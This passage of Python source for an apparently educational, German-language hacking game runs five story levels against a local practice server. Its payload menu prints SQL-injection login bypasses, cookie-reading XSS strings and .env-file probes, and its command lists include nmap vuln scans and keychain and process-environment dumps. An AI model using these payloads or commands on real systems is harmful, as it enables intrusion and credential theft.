                data_part = curl_cmd.split('-d ', 1)[1].strip()
                data = data_part.split(' http')[0].strip()

            # Extract headers
            headers = {}
            header_matches = re.findall(r'-H\s+([\'"])(.*?)\1', curl_cmd)
            for _, header in header_matches:
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()

            # Execute request using requests library with session tracking
            if HAS_REQUESTS and requests is not None:
                if self.http_session is None:
                    self.http_session = requests.Session()
                client = self.http_session

                flat_data = None
                if data is not None:
                    flat_data = {}
                    for item in data.split('&'):
                        if '=' in item:
                            k, v = item.split('=', 1)
                            flat_data[k.strip()] = v
                        else:
                            flat_data[item.strip()] = ''

                if method == 'POST':
                    response = client.post(url, data=flat_data if flat_data is not None else data, headers=headers, timeout=10, allow_redirects=True)
                elif method == 'PUT':
                    response = client.put(url, data=flat_data if flat_data is not None else data, headers=headers, timeout=10)
                elif method == 'DELETE':
                    response = client.delete(url, headers=headers, timeout=10)
                elif method == 'OPTIONS':
                    response = client.options(url, headers=headers, timeout=10)
                elif method == 'HEAD':
                    response = client.head(url, headers=headers, timeout=10)
                else:
                    response = client.get(url, headers=headers, timeout=10, allow_redirects=True)

                output_parts = []
                for h in response.history:
                    output_parts.append(f"HTTP/1.1 {h.status_code} Redirect -> {h.headers.get('Location', '')}")
                output_parts.append(response.text)
                return "\n".join(output_parts) if response.history else response.text
            else:
                # Fallback to urllib
                import urllib.request
                data_bytes = data.encode('utf-8') if data else None
                request_obj = urllib.request.Request(url, data=data_bytes, headers=headers, method=method)
                with urllib.request.urlopen(request_obj, timeout=10) as response:
                    return response.read().decode('utf-8', errors='replace')

        except Exception as e:
            print(f"❌ Server communication error: {e}")
            return None

    def check_level_success(self, level, response_text, original_cmd):
        """Check if level was successfully completed based on real server response"""
        if not response_text:
            return False

        target_value = self.get_target_value(level)
        flag = self.get_flag(level)

        # Level-specific success indicators
        if level == 1:
            # Level 1: Look for API key in .env.local or debug endpoint
            success_indicators = [
                target_value in response_text,
                flag in response_text,
                "API_KEY=" in response_text,
                "level_1_secret" in response_text,
                "FLAG_LEVEL_1" in response_text,
                "VAULT_TOKEN=" in response_text
            ]
            return any(success_indicators)

        elif level == 2:
            # Level 2: Look for API secret endpoint access
            success_indicators = [
                "Access granted" in response_text,
                target_value in response_text,
                flag in response_text,
                "FLAG_LEVEL_2" in response_text,
                "secret api" in response_text.lower()
            ]
            return any(success_indicators)

        elif level == 3:
            # Level 3: Look for SQL injection success
            payload = original_cmd
            if 'username=' in payload and '&password=' in payload:
                import re
                username_match = re.search(r'username=([^&]+)', payload)
                if username_match:
                    sql_payload = username_match.group(1)
                    sql_indicators = ["'", "--", "UNION", "SELECT", "OR", "AND", "1=1", "1=2"]
                    has_sql_chars = any(indicator in sql_payload.upper() for indicator in sql_indicators)

                    if not has_sql_chars:
                        return False  # Not a valid SQL injection attempt

            success_indicators = [
                "Welcome" in response_text,
                "dashboard" in response_text,
                "Redirecting" in response_text,
                "/dashboard" in response_text,
                target_value in response_text,
                flag in response_text,
                "FLAG_LEVEL_3" in response_text,
                ("admin" in response_text.lower() and "logged" in response_text.lower())
            ]
            return any(success_indicators)

        elif level == 4:
            # Level 4: Look for XSS success
            success_indicators = [
                "XSS" in response_text,
                "alert" in response_text,
                "script" in response_text.lower(),
                target_value in response_text,
                flag in response_text,
                "cookie" in response_text.lower(),
                "FLAG_LEVEL_4" in response_text
            ]
            return any(success_indicators)

        elif level == 5:
            # Level 5: Look for forensics success
            success_indicators = [
                target_value in response_text,
                flag in response_text,
                "encryption" in response_text.lower(),
                "key" in response_text.lower(),
                "forensic" in response_text.lower(),
                "FLAG_LEVEL_5" in response_text,
                "memory_dump" in response_text.lower()
            ]
            return any(success_indicators)

        return False

    def check_server_status(self):
        """Check server status"""
        print("\n🔍 Server-Status:")

        # Check if server is running by trying to connect
        server_responding = False
        try:
            if HAS_REQUESTS and requests is not None:
                response = requests.get("http://127.0.0.1:5000", timeout=3)
                if response.status_code == 200:
                    server_responding = True
            else:
                import urllib.request
                response = urllib.request.urlopen("http://127.0.0.1:5000", timeout=3)
                if response.getcode() == 200:
                    server_responding = True
        except:
            pass

        if server_responding:
            print("✅ Server läuft und ist erreichbar")
            print("🌐 URL: http://127.0.0.1:5000")
            print("🔍 Debug: http://127.0.0.1:5000/debug")
            self.server_running = True
        else:
            print("❌ Server ist nicht gestartet")
            print("💡 Möchtest du den Server jetzt starten? (j/n)")
            try:
                choice = input("Wähle: ").strip().lower()
                if choice in ['j', 'ja', 'y', 'yes']:
                    if self.start_server():
                        print("✅ Server erfolgreich gestartet!")
                    else:
                        print("❌ Server-Start fehlgeschlagen")
                else:
                    print("💡 Starte das Spiel (Option 1), um den Server automatisch zu starten")
            except (EOFError, KeyboardInterrupt):
                pass

        try:
            input("\nDrücke Enter zum Fortfahren...")
        except (EOFError, KeyboardInterrupt):
            pass

    def settings(self):
        """Game settings"""
        while True:
            os_display = {
                'linux': 'Linux / Bash 🐧',
                'macos': 'macOS / Zsh 🍎',
                'windows': 'Windows / PowerShell 🪟'
            }.get(self.os_mode, self.os_mode.upper())

            print("\n" + "="*50)
            print("⚙️  EINSTELLUNGEN // SYSTEM CONFIGURATION:")
            print("="*50)
            print("1. Fortschritt zurücksetzen")
            print(f"2. Betriebssystem / Shell-Modus: [{os_display}]")
            print(f"3. Retro Effekte (Typewriter Pacing): [{'ON 🟢' if self.retro_effects else 'OFF ⚪'}]")
            print(f"4. 8-Bit Game Boy Sound-FX: [{'ON 🔊' if self.audio_enabled else 'OFF 🔇'}]")
            print("5. Zurück zum Menü")

            try:
                choice = input("\nWähle (1-5): ").strip()
                if choice == '1':
                    confirm = input("⚠️  Bist du sicher? Das setzt den gesamten Fortschritt zurück (j/N): ").strip().lower()
                    if confirm == 'j':
                        if os.path.exists(self.progress_file):
                            os.remove(self.progress_file)
                        self.current_level = 1
                        self.score = 0
                        self.save_progress()
                        print("✅ Fortschritt zurückgesetzt!")
                elif choice == '2':
                    print("\n🖥️  Wähle deine Shell-Umgebung für Tutorial & Befehle:")
                    print("  [1] Linux / Bash 🐧 (curl, grep, nmap, awk, cat)")
                    print("  [2] macOS / Zsh 🍎 (curl, grep, nmap, lsof)")
                    print("  [3] Windows / PowerShell 🪟 (Invoke-RestMethod, Test-NetConnection, findstr)")
                    sub_c = input("Auswahl (1-3): ").strip()
                    if sub_c == '1':
                        self.os_mode = 'linux'
                    elif sub_c == '2':
                        self.os_mode = 'macos'
                    elif sub_c == '3':
                        self.os_mode = 'windows'
                    print(f"✅ Betriebssystem-Modus gesetzt auf: {self.os_mode.upper()}!")
                    if audio:
                        audio.play_blip()
                    self.save_progress()
                elif choice == '3':
                    self.retro_effects = not self.retro_effects
                    print(f"✅ Retro Effekte {'aktiviert (Text läuft im Typewriter-Takt ein)' if self.retro_effects else 'deaktiviert (geglättete Sofort-Ausgabe)'}!")
                    if audio:
                        audio.play_blip()
                    self.save_progress()
                elif choice == '4':
                    self.audio_enabled = not self.audio_enabled
                    if audio is not None:
                        audio.enabled = self.audio_enabled
                        if self.audio_enabled:
                            audio.play_coin()
                    print(f"✅ 8-Bit Game Boy Audio {'aktiviert 🔊' if self.audio_enabled else 'deaktiviert 🔇'}!")
                    self.save_progress()
                elif choice == '5':
                    break
            except (EOFError, KeyboardInterrupt):
                break

    def play_game(self):
        """Main game loop with storyline integration"""
        print(f"\n🎮 Starte den Erbschafts-Coup für {self.player_name}...")

        print("🎯 Der Server deines Onkels läuft auf: http://127.0.0.1:5000")
        print("🔍 Prüfe den /debug Endpoint für Entwicklungshinweise")
        print("⚠️  Vergiss nicht: Das ist nur für Bildungszwecke!")

        while self.current_level <= 5:
            level_info = self.levels[self.current_level]

            # Enhanced storyline integration for each level
            if self.current_level == 1:
                self.simulate_old_terminal(f"\n🏢 LEVEL {self.current_level}: DAS ERSTE SIEGEL", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Du stehst im Arbeitszimmer deines Onkels.", delay=0.02)
                self.simulate_old_terminal("Der Raum ist voller alter Computer und Server-Racks.", delay=0.02)
                self.simulate_old_terminal("Auf dem Schreibtisch liegt eine verschlüsselte Nachricht:", delay=0.02)
                self.simulate_old_terminal("'Das erste Siegel ist in meinem persönlichen Labor versteckt.'", delay=0.02)
                self.simulate_old_terminal("'Finde es, und du wirst verstehen, warum ich paranoid war.'", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe Web Application Reconnaissance durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Finde die versteckte .env-Datei mit dem ersten Code!", delay=0.02)
            elif self.current_level == 2:
                self.simulate_old_terminal(f"\n🌐 LEVEL {self.current_level}: NETZWERK DER SCHATTEN", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Du hast das erste Siegel gebrochen!", delay=0.02)
                self.simulate_old_terminal("Aber dein Onkel hatte noch mehr Geheimnisse.", delay=0.02)
                self.simulate_old_terminal("Sein Server läuft mit Harrington Industries' proprietärem Netzwerk.", delay=0.02)
                self.simulate_old_terminal("Die Konkurrenten versuchen bereits, sich einzuhacken.", delay=0.02)
                self.simulate_old_terminal("'Das Netzwerk ist mein Meisterwerk,' flüsterte er einmal.", delay=0.02)
                self.simulate_old_terminal("'Nur die Würdigen können es knacken.'", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe Network Discovery durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Finde den versteckten API-Key im Netzwerk!", delay=0.02)
            elif self.current_level == 3:
                self.simulate_old_terminal(f"\n🔐 LEVEL {self.current_level}: DIE DATENBANK DER GEHEIMNISSE", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Das Netzwerk öffnet sich vor dir.", delay=0.02)
                self.simulate_old_terminal("Du findest eine verschlüsselte Datenbank voller dunkler Geheimnisse.", delay=0.02)
                self.simulate_old_terminal("Hier sind alle 'schmutzigen' Geschäfte von Harrington Industries gespeichert.", delay=0.02)
                self.simulate_old_terminal("Dein Onkel wusste, dass nur jemand mit reinem Herzen sie finden würde.", delay=0.02)
                self.simulate_old_terminal("'Die Datenbank enthält die Wahrheit über meine Feinde,' sagte er.", delay=0.02)
                self.simulate_old_terminal("'Aber sie ist mit SQL-Injection verwundbar - absichtlich.'", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe SQL Injection Attack durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Extrahiere den Admin-Hash aus der Datenbank!", delay=0.02)
            elif self.current_level == 4:
                self.simulate_old_terminal(f"\n💬 LEVEL {self.current_level}: DER DIGITALE SPIEGEL", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Die Datenbank öffnet ihre Tore.", delay=0.02)
                self.simulate_old_terminal("Du findest ein altes Kommentar-System - 'Digitaler Spiegel' genannt.", delay=0.02)
                self.simulate_old_terminal("Dein Onkel erschuf es, um die wahre Natur eines Menschen zu reflektieren.", delay=0.02)
                self.simulate_old_terminal("'Wenn jemand XSS versucht, zeigt es seine wahre Absicht,' sagte er.", delay=0.02)
                self.simulate_old_terminal("Die Konkurrenten versuchen bereits, sich einzuschleichen.", delay=0.02)
                self.simulate_old_terminal("Du hörst Schritte im Flur - sie kommen näher!", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe XSS Attack durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Stehle den Session-Cookie des Admins!", delay=0.02)
            elif self.current_level == 5:
                self.simulate_old_terminal(f"\n🎯 LEVEL {self.current_level}: Project Echo", delay=0.02)
                self.simulate_old_terminal("📜 GESCHICHTE: Du hast alle Siegel gebrochen!", delay=0.02)
                self.simulate_old_terminal("Vor dir liegt die finale Kammer - Project Echo.", delay=0.02)
                self.simulate_old_terminal("Die KI, die die Menschheit vor digitalen Katastrophen retten sollte.", delay=0.02)
                self.simulate_old_terminal("Aber sie wurde sabotiert. Von den gleichen Konkurrenten.", delay=0.02)
                self.simulate_old_terminal("'Phoenix wird die Welt verändern,' sagte dein Onkel.", delay=0.02)
                self.simulate_old_terminal("'Aber nur, wenn die richtige Person sie befreit.'", delay=0.02)
                self.simulate_old_terminal("Die Tür zur Kammer öffnet sich. Die Konkurrenten brechen ein!", delay=0.02)
                self.simulate_old_terminal("\n🎯 MISSION: Führe Digital Forensics durch!", delay=0.02)
                self.simulate_old_terminal("🔍 Finde den Master-Encryption-Key und rette Project Echo!", delay=0.02)

            print(f"\n📋 Description: {level_info['description']}")
            print(f"💰 Score: {self.score}")

            if self.current_level == 1:
                self.level_1_server_hacking()
            elif self.current_level == 2:
                self.level_2_network_fundamentals()
            elif self.current_level == 3:
                self.level_3_password_cracking()
            elif self.current_level == 4:
                self.level_4_web_exploitation()
            elif self.current_level == 5:
                self.level_5_advanced_topics()

            # Keine Lives mehr - Spieler kann unbegrenzt versuchen

        if self.current_level > 5:
            print("\n🎉 CONGRATULATIONS! You've claimed your inheritance!")
            print("💰 You're now a billionaire tech heir!")
            print("🏰 The family empire is yours!")
            self.echo_chat("encouragement")

    def sync_session_targets(self):
        """Synchronize target values and flags from the live server"""
        try:
            if HAS_REQUESTS and requests is not None:
                resp = requests.get(f"{self.server_url}/api/session/targets", timeout=2)
                if resp.status_code == 200:
                    data = resp.json()
                    raw_targets = data.get('targets', {})
                    self.targets = {int(k): v for k, v in raw_targets.items()}
                    raw_flags = data.get('flags', {})
                    self.flags = {int(k): v for k, v in raw_flags.items()}
                    return True
        except Exception:
            pass
        return False

    def get_target_value(self, level):
        """Get target value for specific level from synchronized server state"""
        if hasattr(self, 'targets') and self.targets and level in self.targets:
            return self.targets[level]
        if self.sync_session_targets() and level in self.targets:
            return self.targets[level]
        import hashlib
        base_string = f"echo_hacking_level_{level}_{self.player_name or 'daddy'}"
        return hashlib.md5(base_string.encode()).hexdigest()

    def get_flag(self, level):
        """Get CTF flag for level"""
        if hasattr(self, 'flags') and self.flags and level in self.flags:
            return self.flags[level]
        if self.sync_session_targets() and level in self.flags:
            return self.flags[level]
        import hashlib
        s_hash = hashlib.sha256(f"{self.player_name or 'daddy'}_{level}".encode()).hexdigest()
        return f"ECHO{{l{level}_flag_{s_hash[:8]}}}"

    def show_status(self):
        """Show current player and session status"""
        print("\n" + "="*60)
        print("📊 AGENT STATUS // ECHO SESSION INTEL 😈🔥")
        print("="*60)
        print(f"👤 Agent:          {self.player_name}")
        print(f"🎯 Level:          {self.current_level}/5")
        print(f"⭐ Score:          {self.score} Pkt")
        print(f"📍 Server:         {self.server_url} ({'ONLINE 🟢' if self.server_running else 'OFFLINE 🔴'})")
        print(f"🔑 Current Target: {self.get_target_value(self.current_level)[:16]}...")
        print(f"🚩 Current Flag:   {self.get_flag(self.current_level)}")
        print("="*60)

    def show_payloads(self, level):
        """Show tactical attack payloads for the level"""
        print("\n" + "="*60)
        print(f"💣 ECHO'S TACTICAL PAYLOAD ARSENAL // LEVEL {level} 😈🔥")
        print("="*60)
        if level == 1:
            print("  • curl -s http://127.0.0.1:5000/.env.local")
            print("  • curl -s http://127.0.0.1:5000/debug")
            print("  • curl -s -I http://127.0.0.1:5000/")
            print("  • curl -s http://127.0.0.1:5000/robots.txt")
        elif level == 2:
            target2 = self.get_target_value(2)
            print(f"  • curl -H \"X-API-Key: {target2}\" http://127.0.0.1:5000/api/secret")
            print("  • curl -s -X OPTIONS http://127.0.0.1:5000/")
            print("  • powershell Test-NetConnection -ComputerName 127.0.0.1 -Port 5000")
        elif level == 3:
            print("  • curl -X POST -d \"username=admin' OR '1'='1' --&password=test\" http://127.0.0.1:5000/login")
            print("  • curl -X POST -d \"username=admin' UNION SELECT 1,2,3,4,5,6-- &password=test\" http://127.0.0.1:5000/login")
            print("  • Browser: http://127.0.0.1:5000/login -> Username: admin' OR '1'='1' --")
        elif level == 4:
            print("  • <script>alert('XSS')</script>")
            print("  • <img src=x onerror=alert('XSS')>")
            print("  • <svg onload=alert(document.cookie)>")
            print("  • curl -X POST -d \"comment=<script>alert('XSS')</script>\" http://127.0.0.1:5000/comments")
        elif level == 5:
            print("  • curl -s http://127.0.0.1:5000/forensics")
            print("  • curl -s http://127.0.0.1:5000/memory")
            print("  • curl -s http://127.0.0.1:5000/network")
            print("  • curl -s http://127.0.0.1:5000/files")
        print("="*60)

    def handle_decode(self, cmd):
        """Decode base64, hex, or url encoded text"""
        parts = cmd.split(maxsplit=2)
        if len(parts) < 3:
            print("💡 Verwendung: /decode <b64|hex|url> <text>")
            return
        mode, val = parts[1].lower(), parts[2].strip()
        try:
            if mode in ('b64', 'base64'):
                import base64
                decoded = base64.b64decode(val).decode('utf-8', errors='replace')
                print(f"🔓 Base64 Decoded: {decoded}")
            elif mode in ('hex', 'hexadecimal'):
                decoded = bytes.fromhex(val).decode('utf-8', errors='replace')
                print(f"🔓 Hex Decoded: {decoded}")
            elif mode in ('url', 'urldecode'):
                import urllib.parse
                decoded = urllib.parse.unquote(val)
                print(f"🔓 URL Decoded: {decoded}")
            else:
                print(f"⚠️  Unbekannter Modus: {mode}. Wähle b64, hex oder url.")
        except Exception as e:
            print(f"❌ Decode-Fehler: {e}")

    def get_platform_commands(self):
        """Get platform-specific commands based on detected/selected OS environment"""
        if self.os_mode == 'linux':
            return self.get_linux_commands()
        elif self.os_mode == 'macos':
            return self.get_macos_commands()
        elif self.os_mode == 'windows':
            return self.get_windows_commands()
        else:
            return self.get_crossplatform_fallback()

    def get_windows_commands(self):
        """Windows-specific hacking commands - Learn Windows Power"""
        return {
            # Network Analysis
            'port_scan': 'netstat -an | findstr :5000',
            'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
            'port_scan_ps': 'powershell Test-NetConnection -ComputerName 127.0.0.1 -Port 5000',
            'port_scan_detailed': 'netstat -anb | findstr :5000',
            'network_conn': 'netstat -anb',
            'network_ps': 'powershell Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 5000}',
            'tracert': 'tracert 127.0.0.1',
            'ping': 'ping -n 4 127.0.0.1',

            # Process Analysis
            'process_list': 'tasklist /v',
            'process_detailed': 'tasklist /svc',
            'process_ps': 'powershell Get-Process | Select-Object Name,Id,Path',
            'process_tree': 'powershell Get-Process | Format-Table -Property Name,Id,Parent',
            'process_kill': 'taskkill /f /pid',

            # Web Analysis
            'web_scan': 'curl -s http://127.0.0.1:5000/',
            'web_scan_ps': 'powershell Invoke-WebRequest -Uri http://127.0.0.1:5000/',
            'http_headers': 'curl -I http://127.0.0.1:5000/',
            'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
            'web_download': 'powershell Invoke-WebRequest -Uri http://127.0.0.1:5000/ -OutFile output.html',

            # File Operations
            'grep': 'findstr /i',
            'grep_recursive': 'findstr /s /i',
            'file_hash': 'certutil -hashfile file.txt MD5',
            'file_hash_ps': 'powershell Get-FileHash file.txt -Algorithm MD5',
            'file_hash_sha256': 'powershell Get-FileHash file.txt -Algorithm SHA256',
            'file_info': 'powershell Get-ItemProperty file.txt | Select-Object *',
            'file_permissions': 'cacls file.txt',
            'file_owner': 'powershell Get-Acl file.txt | Select-Object Owner',

            # System Information
            'system_info': 'systeminfo',
            'system_ps': 'powershell Get-ComputerInfo',
            'environment': 'set',
            'environment_ps': 'powershell Get-ChildItem Env:',
            'services': 'net start',
            'services_detailed': 'powershell Get-Service | Select-Object Name,Status,StartType',

            # Security & Forensics
            'event_logs': 'wevtutil qe Application /c:10 /f:text',
            'event_logs_ps': 'powershell Get-EventLog -LogName Application -Newest 10',
            'registry': 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'registry_ps': 'powershell Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'firewall': 'netsh advfirewall firewall show rule name=all',
            'firewall_ps': 'powershell Show-NetFirewallRule',

            # Text Processing
            'strings': 'powershell Select-String -Path file.txt -Pattern "search"',
            'hex_dump': 'powershell Format-Hex -Path file.txt',
            'base64_encode': 'powershell [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("text"))',
            'base64_decode': 'powershell [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("base64"))',

            # Advanced Windows Tools
            'wmic_process': 'wmic process get name,processid,commandline',
            'wmic_service': 'wmic service get name,startmode,pathname',
            'wmic_startup': 'wmic startup get caption,command',
            'schtasks': 'schtasks /query /fo LIST',
            'driverquery': 'driverquery /v'
        }

    def get_linux_commands(self):
        """Linux-specific hacking commands - Learn Linux Power"""
        return {
            # Advanced Network Scanning
            'port_scan': 'nmap -sS 127.0.0.1',
            'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
            'port_scan_udp': 'nmap -sU 127.0.0.1',
            'port_scan_all': 'nmap -p- 127.0.0.1',
            'port_scan_service': 'nmap -sV 127.0.0.1',
            'port_scan_os': 'nmap -O 127.0.0.1',
            'port_scan_aggressive': 'nmap -A 127.0.0.1',
            'port_scan_script': 'nmap --script vuln 127.0.0.1',

            # Network Analysis
            'network_conn': 'netstat -tulpn',
            'network_ss': 'ss -tulpn',
            'network_listen': 'lsof -i :5000',
            'network_capture': 'tcpdump -i lo port 5000 -w capture.pcap',
            'traceroute': 'traceroute 127.0.0.1',
            'dig': 'dig @8.8.8.8 google.com',
            'whois': 'whois example.com',

            # Process Analysis
            'process_list': 'ps aux',
            'process_tree': 'pstree',
            'process_detailed': 'ps auxf',
            'process_env': 'cat /proc/$PID/environ 2>/dev/null',
            'process_fd': 'lsof -p $PID',
            'process_kill': 'kill -9',

            # Web Analysis
            'web_scan': 'curl -s http://127.0.0.1:5000/',
            'web_scan_nikto': 'nikto -h http://127.0.0.1:5000',
            'web_scan_dirb': 'dirb http://127.0.0.1:5000/',
            'web_scan_gobuster': 'gobuster dir -u http://127.0.0.1:5000 -w /usr/share/wordlists/dirb/common.txt',
            'web_scan_wfuzz': 'wfuzz -c -z file,wordlist.txt --hc 404 http://127.0.0.1:5000/FUZZ',
            'http_headers': 'curl -I http://127.0.0.1:5000/',
            'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
            'http_trace': 'curl -X TRACE http://127.0.0.1:5000/',

            # File Operations
            'grep': 'grep -i',
            'grep_recursive': 'grep -r -i',
            'grep_context': 'grep -B 3 -A 3 -i',
            'file_hash': 'md5sum file.txt',
            'file_hash_sha256': 'sha256sum file.txt',
            'file_info': 'stat file.txt',
            'file_permissions': 'ls -la file.txt',
            'file_find': 'find . -name "*.txt" -type f',

            # System Information
            'system_info': 'uname -a',
            'system_detailed': 'cat /etc/os-release',
            'kernel_info': 'cat /proc/version',
            'cpu_info': 'cat /proc/cpuinfo',
            'memory_info': 'cat /proc/meminfo',
            'disk_info': 'df -h',
            'mounted_fs': 'mount',
            'environment': 'env',
            'services': 'systemctl list-units --type=service',
            'services_sysv': 'service --status-all',

            # Security & Forensics
            'logs_syslog': 'tail -f /var/log/syslog',
            'logs_auth': 'tail -f /var/log/auth.log',
            'logs_apache': 'tail -f /var/log/apache2/access.log',
            'audit_logs': 'ausearch -i',
            'selinux_status': 'sestatus',
            'apparmor_status': 'aa-status',
            'firewall_iptables': 'iptables -L -n -v',
            'firewall_ufw': 'ufw status',

            # Text Processing
            'strings': 'strings file.txt',
            'hex_dump': 'hexdump -C file.txt',
            'base64_encode': 'base64 file.txt',
            'base64_decode': 'base64 -d file.txt',
            'xxd': 'xxd file.txt',
            'od': 'od -c file.txt',

            # Advanced Linux Tools
            'ldd': 'ldd /bin/ls',
            'strace': 'strace -e trace=network,process ls',
            'ltrace': 'ltrace ls',
            'gdb': 'gdb --batch --ex "info functions" /bin/ls',
            'objdump': 'objdump -d /bin/ls',
            'readelf': 'readelf -a /bin/ls'
        }

    def get_macos_commands(self):
        """macOS-specific hacking commands - Learn macOS Power"""
        return {
            # Network Analysis
            'port_scan': 'netstat -an | grep :5000',
            'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
            'network_conn': 'netstat -an',
            'network_lsof': 'lsof -i :5000',
            'network_pf': 'pfctl -s rules',
            'network_route': 'netstat -rn',
            'ping': 'ping -c 4 127.0.0.1',

            # Process Analysis
            'process_list': 'ps aux',
            'process_tree': 'pstree',
            'process_detailed': 'ps auxm',
            'process_top': 'top -l 1',
            'process_vmmap': 'vmmap $PID',

            # Web Analysis
            'web_scan': 'curl -s http://127.0.0.1:5000/',
            'http_headers': 'curl -I http://127.0.0.1:5000/',
            'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',

            # File Operations
            'grep': 'grep -i',
            'grep_recursive': 'grep -r -i',
            'file_hash': 'md5 file.txt',
            'file_hash_openssl': 'openssl dgst -md5 file.txt',
            'file_info': 'stat file.txt',
            'file_permissions': 'ls -la file.txt',
            'file_find': 'find . -name "*.txt" -type f',

            # System Information
            'system_info': 'system_profiler SPSoftwareDataType',
            'system_profiler': 'system_profiler',
            'hardware_info': 'system_profiler SPHardwareDataType',
            'network_info': 'system_profiler SPNetworkDataType',
            'disk_info': 'diskutil info disk0',
            'mounted_volumes': 'mount',
            'environment': 'env',

            # Security & Forensics
            'logs_system': 'log show --predicate "process == \\"python\\"" --last 1h',
            'logs_console': 'syslog -F $(date +%Y-%m-%d) | tail -20',
            'sip_status': 'csrutil status',
            'gatekeeper_status': 'spctl --status',
            'sandbox_status': 'sandbox-exec -f /tmp/test.sb true',
            'keychain_dump': 'security dump-keychain',
            'codesign_verify': 'codesign --verify --verbose',

            # Text Processing
            'strings': 'strings file.txt',
            'hex_dump': 'hexdump -C file.txt',
            'base64_encode': 'base64 file.txt',
            'base64_decode': 'base64 -D file.txt',
            'plist_read': 'plutil -p file.plist',
            'defaults_read': 'defaults read com.apple.finder',

            # Advanced macOS Tools
            'airport_info': '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I',
            'scutil_dns': 'scutil --dns',
            'scutil_proxy': 'scutil --proxy',
            'launchctl_list': 'launchctl list',
            'kextstat': 'kextstat',
            'nvram': 'nvram -p'
        }

    def get_crossplatform_fallback(self):
        """Enhanced fallback commands that work on most systems"""
        return {
            'port_scan': 'netstat -an',
            'port_scan_alt': 'python telnet_client.py 127.0.0.1 5000',
            'web_scan': 'curl -s http://127.0.0.1:5000/',
            'http_headers': 'curl -I http://127.0.0.1:5000/',
            'http_methods': 'curl -X OPTIONS http://127.0.0.1:5000/',
            'grep': 'grep -i',
            'process_list': 'ps aux',
            'network_conn': 'netstat -an',
            'file_hash': 'md5sum file.txt',
            'strings': 'strings file.txt',
            'file_type': 'file file.txt',
            'which_python': 'which python',
            'python_version': 'python --version',
            'curl_version': 'curl --version',
            'test_connection': 'curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:5000/'
        }

    def typewriter_effect(self, text, delay=0.03, color_code=None):
        """Simulate old terminal typewriter effect"""
        if not self.retro_effects:
            if color_code:
                print(f"\033[{color_code}m{text}\033[0m")
            else:
                print(text)
            time.sleep(0.02)
            return

        if color_code:
            print(f"\033[{color_code}m", end="", flush=True)

        for char in text:
            print(char, end="", flush=True)
            time.sleep(delay)

        if color_code:
            print("\033[0m", end="", flush=True)
        print()

    def simulate_command_execution(self, command, output, delay=0.1):
        """Simulate old system command execution with character-by-character output"""
        print(f"\n💻 {self.player_name}@hacking-target:~$ {command}")

        if not self.retro_effects:
            if output:
                print(f"📄 {output}")
            else:
                print("📄 (Keine Ausgabe)")
            time.sleep(0.1)
            return

        time.sleep(0.5)

        # Simulate command processing
        print("🔄 Verarbeite Befehl...", end="", flush=True)
        for i in range(3):
            time.sleep(0.3)
            print(".", end="", flush=True)
        print()

        # Simulate output appearing line by line
        if output:
            lines = output.split('\n')
            for line in lines:
                if line.strip():
                    # Simulate old terminal line-by-line output
                    self.typewriter_effect(f"📄 {line}", delay=0.02, color_code="32")
                    time.sleep(0.1)
                else:
                    time.sleep(0.05)
        else:
            self.typewriter_effect("📄 (Keine Ausgabe)", delay=0.02, color_code="33")

    def simulate_old_terminal(self, text, delay=0.01):
        """Simulate old mainframe/terminal display with readable pacing"""
        if not self.retro_effects:
            print(text)
            time.sleep(0.015)
            return

        for char in text:
            print(char, end="", flush=True)
            time.sleep(delay)
        print()

    def show_retro_banner(self):
        """Display retro terminal banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  [ECHO'S ULTIMATE HACKING SIMULATOR BETA v1.0.1]             ║
║  [          EDUCATIONAL PURPOSE ONLY!          ]             ║
║  [DO NOT USE ON REAL SYSTEMS WITHOUT PERMISSION]             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """

        # Clear screen first
        os.system('cls' if os.name == 'nt' else 'clear')
        if audio:
            audio.play_boot()

        # Type the banner character by character
        for line in banner.split('\n'):
            self.simulate_old_terminal(line, delay=0.005)
            time.sleep(0.1)

        time.sleep(1)
        print("\n" + "="*70)
        self.simulate_old_terminal("INITIALIZING HACKING SIMULATOR...", delay=0.03)
        self.simulate_old_terminal("LOADING VULNERABILITY DATABASE...", delay=0.03)
        self.simulate_old_terminal("ESTABLISHING SECURE CONNECTION...", delay=0.03)
        self.simulate_old_terminal("READY FOR MISSION, AGENT.", delay=0.03)
        print("="*70)
        time.sleep(2)

    def execute_game_command(self, cmd, level, success_patterns=None):
        """Execute a game command with unified routing, single execution, and success detection"""
        # Interactive helpers
        if cmd in ("/echo", "/hint"):
            self.echo_chat(f"level{level}" if f"level{level}" in self.echo_responses else "hint")
            return False, None
        elif cmd == "/help":
            self.show_level_help(level)
            return False, None
        elif cmd == "/status":
            self.show_status()
            return False, None
        elif cmd == "/payloads":
            self.show_payloads(level)
            return False, None
        elif cmd.startswith("/decode"):
            self.handle_decode(cmd)
            return False, None

        # Auto-convert simple URLs
        if cmd.startswith("http://") or cmd.startswith("https://"):
            cmd = f"curl -s {cmd}"
